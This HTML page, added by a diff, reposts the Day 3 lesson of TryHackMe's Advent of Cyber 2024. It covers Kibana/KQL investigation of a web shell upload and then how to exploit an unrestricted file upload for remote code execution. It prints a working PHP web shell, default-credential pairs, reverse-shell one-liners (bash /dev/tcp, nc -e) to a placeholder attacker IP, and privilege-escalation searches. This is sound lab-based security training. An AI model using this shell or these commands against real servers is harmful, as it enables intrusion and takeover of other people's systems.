@@ -1,0 +1,687 @@
+<!doctype html>
+<html>
+  <head>
+  <title>
+    
+      Try Hack Me Advent of Cyber - Day 3 | THM Advent of Cyber 2024
+    
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+  <!-- Use Atom -->
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="THM Advent of Cyber 2024" />
+  <!-- RSS-v2.0
+  <link href="/rss-feed.xml" type="application/rss+xml" rel="alternate" title="THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication"/>
+  //-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto|Source+Code+Pro">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+  </script>
+  <!-- Google Analytics -->
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+  <!-- Use Jekyll SEO plugin -->
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Try Hack Me Advent of Cyber - Day 3 | THM Advent of Cyber 2024</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Try Hack Me Advent of Cyber - Day 3" />
+<meta name="author" content="Michael" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="| **:Advent of Cyber: New Task Release!** Even if I wanted to go, their vulnerabilities wouldn’t allow it. | |—-|" />
+<meta property="og:description" content="| **:Advent of Cyber: New Task Release!** Even if I wanted to go, their vulnerabilities wouldn’t allow it. | |—-|" />
+<link rel="canonical" href="http://localhost:4000/Day3" />
+<meta property="og:url" content="http://localhost:4000/Day3" />
+<meta property="og:site_name" content="THM Advent of Cyber 2024" />
+<meta property="og:image" content="http://localhost:4000/day3-logo.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-03T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/day3-logo.png" />
+<meta property="twitter:title" content="Try Hack Me Advent of Cyber - Day 3" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Michael"},"dateModified":"2024-12-03T00:00:00-05:00","datePublished":"2024-12-03T00:00:00-05:00","description":"| **:Advent of Cyber: New Task Release!** Even if I wanted to go, their vulnerabilities wouldn’t allow it. | |—-|","headline":"Try Hack Me Advent of Cyber - Day 3","image":"http://localhost:4000/day3-logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Day3"},"url":"http://localhost:4000/Day3"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+  <body>
+    <div class="container">
+      <header class="site-header">
+  <h3 class="site-title">
+    <a href="/">THM Advent of Cyber 2024</a>
+  </h3>
+  <nav class="menu-list">
+    
+      <a href="/about" class="menu-link">About</a>
+    
+      <a href="/contact" class="menu-link">Contact</a>
+    
+    
+      <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+      <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+    
+  </nav>
+  <div class="dropdown">
+    <button class="dropbtn"><i class="fa fa-bars" aria-hidden="true"></i></button>
+    <div class="dropdown-content">
+      
+        <a href="/about" class="menu-link">About</a>
+      
+        <a href="/contact" class="menu-link">Contact</a>
+      
+      
+        <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+      
+        <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+      
+    </div>
+  </div>
+</header>
+
+      <div class="content-wrapper">
+        <div class="post-content">
+  <h1>
+    Try Hack Me Advent of Cyber - Day 3
+  </h1>
+  
+    <span class="post-date">
+  Written on
+  
+  December
+  3rd
+    ,
+  2024
+  by
+  
+    Michael
+  
+</span>
+
+  
+  
+    <div class="featured-image">
+      <img src="/assets/img/day3-logo.png">
+    </div>
+  
+  <article>
+    <p>| **:Advent of Cyber: New Task Release!** Even if I wanted to go, their vulnerabilities wouldn’t allow it. |
+|—-|</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><img src="https://ci3.googleusercontent.com/meips/ADKq_Na3wN1_grm57GwLvH_0tnfSAroTdFFJZyJalxT9b51NtilSwYCQnMCDc-8919fWyBL79vBULcij74MARv5MoQO275Uvouox3btQta5XgmOrN7dc87Dcrm1pK2kMMFoYLdnnXX_A9IbJ1mOu-U-hrEm11iYkq2Lu4DCP2YtsrNr3H7iOvmkwe2CSUJzqTz0jC_yawCsflLxzkFzT_bIfSLhxLAh7b1YuyQHn5gQVq8lFlw=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731418813195_Glitch%20-%20AoC%20Character%20Card%20326px_01JCG9MX80PEFE5CD2SW7T3B1T.png" alt="" /> \n  \n In day 3 of Advent of Cyber, Glitch attends a security conference only to realise that their web application is not secure. The SOC team investigates. </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>**Topics Covered:**  \n Log analysis (Web app logs and attacks)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The Story</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420330182.png" alt="Task banner for DAY 3" /></p>
+
+<p>Today’s AoC challenge follows a rather unfortunate series of events for the Glitch. Here is a little passage which sets the scene for today’s task:</p>
+
+<blockquote>
+  <p><em>Late one Christmas evening the Glitch had a feeling,</em></p>
+
+  <p><em>Something forgotten as he stared at the ceiling.</em></p>
+
+  <p><em>He got up out of bed and decided to check,</em></p>
+
+  <p><em>A note on his wall: ”Two days! InsnowSec”.</em></p>
+
+  <p><br />
+<em>With a click and a type he got his hotel and tickets,</em></p>
+
+  <p><em>And sank off to sleep to the sound of some crickets.</em></p>
+
+  <p><em>Luggage in hand, he had arrived at Frosty Pines,</em></p>
+
+  <p><em>“To get to the conference, just follow the signs”.</em></p>
+
+  <p><br />
+<em>Just as he was ready the Glitch got a fright,</em></p>
+
+  <p><em>An RCE vulnerability on their website ?!?</em></p>
+
+  <p><em>He exploited it quick and made a report,</em></p>
+
+  <p><em>But before he could send arrived his transport.</em></p>
+
+  <p><br />
+<em>In the Frosty Pines SOC they saw an alert,</em></p>
+
+  <p><em>This looked quite bad, they called an expert.</em></p>
+
+  <p><em>The request came from a room, but they couldn’t tell which,</em></p>
+
+  <p><em>The logs saved the day, it was the room of…the Glitch.</em></p>
+</blockquote>
+
+<p>\n</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310037301.png" alt="Frosty Pines Hotel Graphic" /> \n</p>
+
+<p>In this task, we will cover how the SOC team and their expert were able to find out what had happened (Operation Blue) and how the Glitch was able to gain access to the website in the first place (Operation Red). Let’s get started, shall we? \n</p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<ul>
+  <li>Learn about Log analysis and tools like ELK.</li>
+  <li>Learn about KQL and how it can be used to investigate logs using ELK.</li>
+  <li>Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.</li>
+</ul>
+
+<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
+
+<p>Before moving forward, review the questions in the connection card below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731423722811.png" alt="AoC connection card -a VM and AttackBox needs to be started" /> \n</p>
+
+<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine for the practical. The practical VM may take 5 minutes to become accessible.</p>
+
+<p>You will also need to start the AttackBox by pressing the <code class="language-plaintext highlighter-rouge">Start AttackBox</code> button at the top of the room. Alternatively, you can connect your own hacking machine by using the TryHackMe VPN.</p>
+
+<h2 id="operation-blue">OPERATION BLUE</h2>
+
+<p>In this section of the lesson, we will take a look at what tools and knowledge is required for the <em>blue</em> segment, that is the investigation of the attack itself using tools which enable is to analyse the logs.</p>
+
+<p>For the first part of Operation Blue, we will demonstrate how to use ELK to analyse the logs of a demonstration web app - WareVille Rails. Feel free to following along for practice.</p>
+
+<h2 id="log-analysis--introducing-elk">Log Analysis &amp; Introducing ELK</h2>
+
+<p>Log analysis is crucial to blue-teaming work, as you have likely discovered through this year’s Advent of Cyber.</p>
+
+<p>Analysing logs can quickly become overwhelming, especially if you have multiple devices and services. ELK, or Elasticsearch, Logstash, and Kibana, combines data analytics and processing tools to make analysing logs much more manageable. ELK forms a dedicated stack that can aggregate logs from multiple sources into one central place.</p>
+
+<p>Explaining how ELK collates and processes these logs is out of the scope of today’s task. However, if you wish to learn more, you can check out the <a href="https://tryhackme.com/r/room/investigatingwithelk101">Investigating with ELK 101</a> room. For now, it’s important to note that multiple processes behind the scenes achieve this.</p>
+
+<p>The first part of today’s task is to investigate the attack on Frosty Pines Resort’s Hotel Management System to see what it looks like to a blue teamer. You will then test your web app skills by recreating the attack.</p>
+
+<h2 id="using-elk">Using ELK</h2>
+
+<p>Upon loading the URL <a href="http://MACHINE_IP:5601/">http://MACHINE_IP:5601/</a> within your AttackBox’s browser, you will be greeted with the ELK Home page.</p>
+
+<p>For today’s task, we will use Kibana’s <strong>Discover</strong> interface to review Apache2 logs. To access this, simply click on the three lines located at the top left of the page to open the slide-out tray. Under the <strong>Analytics</strong> heading, click on <strong>Discover</strong>.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/1.gif" alt="Click on discover gif" /></p>
+
+<p>We will need to select the collection that is relevant to us. A collection is a group of logs. For this stage of Operation Blue, we will be reviewing the logs present within the “wareville-rails” collection. To select this collection, click on the dropdown on the left of the display.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731407486561.png" alt="selecting the &quot;wareville-rails&quot; index pattern in ELK" /></p>
+
+<p>Once you have done this, you will be greeted with a screen saying, “No results match your search criteria”. This is because no logs have been ingested within the last 15 minutes. Do not panic; we will discuss how to change this shortly.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/2.png" alt="Opening the Kibana discover page, after selecting the collection that we wish to use. Note here that no logs are shown, because the time range is set to the last 15 minutes." /></p>
+
+<p>To change the date and time, click the text located on the right side of the box that has the calendar icon. Select ”<strong>Absolute”</strong> from the dropdown, where you can now select the start date and time. Next, click on the text on the right side of the arrow to and repeat the process for the end date and time.</p>
+
+<p>For the WareVille Rails collection, we will need to set the start time to <strong>October 1 2024 00:00:00</strong>, and the end time to <strong>October 1 23:59:59</strong></p>
+
+<p>If you are stuck, refer to the GIF below. Please note that the day and time in this demonstration of WareVille Rails will differ from the times required to review the FrostyPines Resorts collection in the second half of the practical .</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/3.gif" alt="A GIF showing how to modify the time range within Kibana" /></p>
+
+<p>Now that we can see some entries, let’s go over the basics of the Kibana Discover UI.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/4.png" alt="Kibana discovery UI" /></p>
+
+<ol>
+  <li><strong>Search Bar:</strong> Here, we can place our search queries using KQL</li>
+  <li><strong>Index Pattern:</strong> An index pattern is a collection of logs. This can be from a specific host or, for example, multiple hosts with a similar purpose (such as multiple web servers). In this case, the index pattern is all logs relating to ”wareville-rails”</li>
+  <li><strong>Fields:</strong> This pane shows us the fields that Elasticsearch has parsed from the logs. For example, timestamp, response type, and IP address.</li>
+  <li><strong>Timeline:</strong> This visualisation displays the event count over a period of time</li>
+  <li><strong>Documents (Logs):</strong> These entries are the specific entries in the log file</li>
+  <li><strong>Time Filter:</strong> We can use this to narrow down a specific time frame (absolute). Alternatively, we can search for logs based on relativity. I.e. ”Last 7 days”.</li>
+</ol>
+
+<h2 id="kibana-query-language-kql">Kibana Query Language (KQL)</h2>
+
+<p>KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values. For example, querying if a value within a field exists or matches a value. If you are familiar with Splunk, you may be thinking of SPL (Search Processing Language).</p>
+
+<p>For example, the query to search all documents for an IP address may look like <code class="language-plaintext highlighter-rouge">ip.address: "10.10.10.10"</code>. \n</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420515473.png" alt="IP address query" /> \n</p>
+
+<p>Alternatively, Kibana also allows using Lucene query, an advanced language that supports features such as fuzzy terms (searches for terms that are similar to the one provided), regular expressions, etc. For today’s task, we will stick with using KQL, which has been enabled by default. The table below contains a mini-cheatsheet for KQL syntax that you may find helpful in today’s task.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Query/Syntax</strong></th>
+      <th><strong>Description</strong></th>
+      <th><strong>Example</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>” “</td>
+      <td>The two quotation marks are used to search for specific values within the documents. Values in quotation marks are used for <strong>exact</strong> searches.</td>
+      <td>“TryHackMe”</td>
+    </tr>
+    <tr>
+      <td>*</td>
+      <td>The asterisk denotes a wildcard, which searches documents for similar matches to the value provided.</td>
+      <td>United* (would return United Kingdom and United States)</td>
+    </tr>
+    <tr>
+      <td>OR</td>
+      <td>This logical operator is used to show documents that contain <strong>either</strong> of the values provided.</td>
+      <td>“United Kingdom” OR “England”</td>
+    </tr>
+    <tr>
+      <td>AND</td>
+      <td>This logical operator is used to show documents that contain <strong>both</strong> values.</td>
+      <td>“Ben” AND “25”</td>
+    </tr>
+    <tr>
+      <td>:</td>
+      <td>This is used to search the (specified) field of a document for a value, such as an IP address. Note that the field you provide here will depend on the fields available in the index pattern.</td>
+      <td>ip.address: 10.10.10.10</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="investigating-a-web-attack-with-elk">Investigating a Web Attack With ELK</h2>
+
+<p>**Scenario:** Thanks to our extensive intrusion detection capabilities, our systems alerted the SOC team to a web shell being uploaded to the WareVille Rails booking platform on Oct 1, 2024. Our task is to review the web server logs to determine how the attacker achieved this. \n</p>
+
+<p>If you would like to follow along, ensure that you have the “<strong>wareville-rails</strong>” collection selected like so:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408967537.png" alt="selecting the wareville-rails collection within ELK to follow along with this stage of operation blue" /> \n</p>
+
+<p>To investigate this scenario, let’s change the time filter to show events for the day of the attack, setting the start date and time to “<strong>Oct 1, 2024 @ 00:00:00.000</strong>” and the end date and time to “<strong>Oct 2, 2024 @ 00:00:00.000</strong>”.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/6.png" alt="October 1st - 2nd Date range" /> \n</p>
+
+<p>You will see the logs have now populated within the display. Please note that the quantity of entries (hits) in this task may differ to the amount on the practical VM.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/7.png" alt="Logs" /></p>
+
+<p>An incredibly beneficial feature of ELK is that we can filter out noise. A web server (especially a popular one) will likely have a large number of logs from user traffic—completely unrelated to the attack. Using the fields pane on the left, we can click on the “<strong>+</strong>” and “<strong>-</strong>” icons next to the field to show only that value or to remove it from the display, respectively.</p>
+
+<p><strong>Fun fact:</strong> Clicking on these filters is actually just applying the relevant KQL syntax.</p>
+
+<p>Note in the GIF below how the logs are being filtered to only show logs containing the IP address 10.13.27.115 (reducing the count from 1,028 to 423 hits). We can combine filtering multiple fields in or out to drill down specifically into the logs.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/8.gif" alt="IP filtering narrow down gif" /> \n</p>
+
+<p>To remove applied filters, simply click on the “<strong>x</strong>” alongside the filter, just below the search bar. \n</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/9.png" alt="Filters image" /></p>
+
+<p>In this investigation, let’s look at the activity of the IP address 10.9.98.230. We can click on the “clientip” field to see the IPs with the most values.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/10.png" alt="IP with most values" /></p>
+
+<p>Using the timeline at the top, we can see a lot of activity from this IP address took place between 11:30:00 and 11:35:00. This would be a good place to begin our analysis.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/11.png" alt="Timeline narrowed down" /></p>
+
+<p>Each log can be expanded by using the ”<strong>&gt;</strong>“ icon located on the left of the log/document. Fortunately, the logs are pretty small in this instance, so we can browse through them to look for anything untoward. \n</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/12.gif" alt="log" /></p>
+
+<p>After some digging, a few logs stand out. Looking at the <strong>request</strong> field, we can see that a file named “shell.php” has been accessed, with a few parameters “<strong>c</strong>“ and “<strong>d</strong>“ containing commands. These are likely to be commands input into some form of web shell. \n</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/13.png" alt="Web shell input commands logs" /></p>
+
+<p>Now that we have an initial lead, let’s use a search query to find all logs that contain “<strong>shell.php</strong>”. Using the search bar at the top, the query <code class="language-plaintext highlighter-rouge">message: "shell.php"</code> will search for all entries of “<strong>shell.php</strong>“ in the message field of the logs.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/14.png" alt="shell.php narrow down" /></p>
+
+<h2 id="operation-red">OPERATION RED</h2>
+
+<p>In this section we will now take a look at the <em>red</em> aspect. In other words, the attack itself and how it was carried out.</p>
+
+<h2 id="why-do-websites-allow-file-uploads">Why Do Websites Allow File Uploads</h2>
+
+<p>File uploads are everywhere on websites, and for good reason. Users often need to upload files like profile pictures, invoices, or other documents to update their accounts, send receipts, or submit claims. These features make the user experience smoother and more efficient. But while this is convenient, it also creates a risk if file uploads aren’t handled properly. If not properly secured, this feature can open up various vulnerabilities attackers can exploit.</p>
+
+<h2 id="file-upload-vulnerabilities">File Upload Vulnerabilities</h2>
+
+<p>File upload vulnerabilities occur when a website doesn’t properly handle the files that users upload. If the site doesn’t check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:</p>
+
+<ul>
+  <li><strong>RCE</strong>: Uploading a script that the server runs gives the attacker control over it.</li>
+  <li><strong>XSS</strong>: Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker’s server.</li>
+</ul>
+
+<p>These can happen if a site doesn’t properly secure its file upload functionality.</p>
+
+<h2 id="why-unrestricted-file-uploads-are-dangerous">Why Unrestricted File Uploads Are Dangerous</h2>
+
+<p>Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file’s contents aren’t properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.</p>
+
+<p>Examples of abuse through unrestricted file uploads include:</p>
+
+<ul>
+  <li>Uploading a script that the server executes, leading to RCE.</li>
+  <li>Uploading a crafted image file that triggers a vulnerability when processed by the server.</li>
+  <li>Uploading a web shell and browsing to it directly using a browser.</li>
+</ul>
+
+<h2 id="usage-of-weak-credentials">Usage of Weak Credentials</h2>
+
+<p>One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.</p>
+
+<p>Below are some examples of weak/default credentials that attackers might try:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Username</strong></th>
+      <th><strong>Password</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>admin</td>
+      <td>admin</td>
+    </tr>
+    <tr>
+      <td>administrator</td>
+      <td>administrator</td>
+    </tr>
+    <tr>
+      <td>admin@domainname</td>
+      <td>admin</td>
+    </tr>
+    <tr>
+      <td>guest</td>
+      <td>guest</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Attackers can use tools or try these common credentials manually, which is often all it takes to break into the system.</p>
+
+<h2 id="what-is-remote-code-execution-rce">What is Remote Code Execution (RCE)</h2>
+
+<p>Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310085341.png" alt="Frosty Pines Hotel Key Graphic" /> \n</p>
+
+<h2 id="what-is-a-web-shell">What Is a Web Shell</h2>
+
+<p>A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.</p>
+
+<p>For example, attackers could use a web shell to:</p>
+
+<ul>
+  <li>Execute commands on the server</li>
+  <li>Move laterally within the network</li>
+  <li>Download sensitive data or pivot to other services</li>
+</ul>
+
+<p>A web shell typically gives the attacker a web-based interface to run commands. Still, in some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.</p>
+
+<p>Okay, now that we’re familiar with a remote code execution vulnerability and how it works, let’s take a look at how we would exploit it!</p>
+
+<h2 id="practice-makes-perfect">Practice Makes Perfect</h2>
+
+<p>To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today’s task, we will demonstrate achieving RCE via unrestricted file upload within an <a href="https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System">open-source railway management system</a> that has this vulnerability<a href="https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md"> built into it</a>.</p>
+
+<h2 id="exploiting-rce-via-file-upload">Exploiting RCE via File Upload</h2>
+
+<p>Now we’re going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.</p>
+
+<p>Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">command</span><span class="dl">"</span> <span class="nx">autofocus</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">command</span><span class="dl">"</span> <span class="nx">size</span><span class="o">=</span><span class="dl">"</span><span class="s2">50</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">Execute</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="p">?</span><span class="nx">php</span>
+    <span class="k">if</span><span class="p">(</span><span class="nf">isset</span><span class="p">(</span><span class="nx">$_GET</span><span class="p">[</span><span class="dl">'</span><span class="s1">command</span><span class="dl">'</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="nf">system</span><span class="p">(</span><span class="nx">$_GET</span><span class="p">[</span><span class="dl">'</span><span class="s1">command</span><span class="dl">'</span><span class="p">]</span> <span class="p">.</span> <span class="dl">'</span><span class="s1"> 2&gt;&amp;1</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/pre</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the <code class="language-plaintext highlighter-rouge">system()</code> PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053142390.png" alt="Railway profile page" /></p>
+
+<p>Instead of a new profile picture, we can upload our malicious PHP script and update our profile:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053158718.png" alt="Profile picture uploaded" /></p>
+
+<p>In the case of this application, the RCE is possible through unrestricted file upload. Once this “profile picture” is uploaded and updated, it is stored in the <code class="language-plaintext highlighter-rouge">/admin/assets/img/profile/</code> directory. The file can then be accessed directly via <code class="language-plaintext highlighter-rouge">http://&lt;ip-address-or-localhost&gt;/&lt;projectname&gt;/admin/assets/img/profile/shell.php</code>. When this is accessed, we can then see the malicious code in action:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358466.png" alt="Malicious code in action" /> \n</p>
+
+<p>Now, we can run commands directly against the operating system using this bar, and the output will be displayed. For example, running the command <code class="language-plaintext highlighter-rouge">pwd</code> now returns the following:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358453.png" alt="Command being run" /></p>
+
+<h2 id="making-the-most-of-it">Making the Most of It</h2>
+
+<p>Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on **a)**what your goal is and **b)**what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system): \n</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Command</strong></th>
+      <th><strong>Use</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>ls</td>
+      <td>Will give you an idea of what files/directories surround you</td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td>Will give you an idea of where in the system you are</td>
+    </tr>
+    <tr>
+      <td>whoami</td>
+      <td>Will let you know who you are in the system</td>
+    </tr>
+    <tr>
+      <td>hostname</td>
+      <td>The system name and potentially its role in the network</td>
+    </tr>
+    <tr>
+      <td>uname -a</td>
+      <td>Will give you some system information like the OS, kernel version, and more</td>
+    </tr>
+    <tr>
+      <td>id</td>
+      <td>If the current user is assigned to any groups</td>
+    </tr>
+    <tr>
+      <td>ifconfig</td>
+      <td>Allows you to understand the system’s network setup</td>
+    </tr>
+    <tr>
+      <td>bash -i &gt;&amp; /dev/tcp/<your-ip>/<port> 0&gt;&amp;1</port></your-ip></td>
+      <td>A command used to begin a reverse shell via bash</td>
+    </tr>
+    <tr>
+      <td>nc -e /bin/sh <your-ip> <port></port></your-ip></td>
+      <td>A command used to begin a reverse shell via Netcat</td>
+    </tr>
+    <tr>
+      <td>find / -perm -4000 -type f 2&gt;/dev/null</td>
+      <td>Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)</td>
+    </tr>
+    <tr>
+      <td>find / -writable -type  f 2&gt;/dev/null | grep -v “/proc/”</td>
+      <td>Also helpful in privilege escalation attempts used to find files with writable permissions \n</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>These are just some commands that can be run following a successful RCE exploit. It’s very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.</p>
+
+<h2 id="practical">Practical</h2>
+
+<p>Your task today is two-fold. First, you must access Kibana on <a href="http://MACHINE_IP:5601">MACHINE_IP:5601</a> to investigate the attack and answer the blue questions below. Then, you will proceed to Frosty Pines Resort’s website at <a href="http://frostypines.thm">http://frostypines.thm</a> and recreate the attack to answer the red questions and inform the developers what element of the website was vulnerable.</p>
+
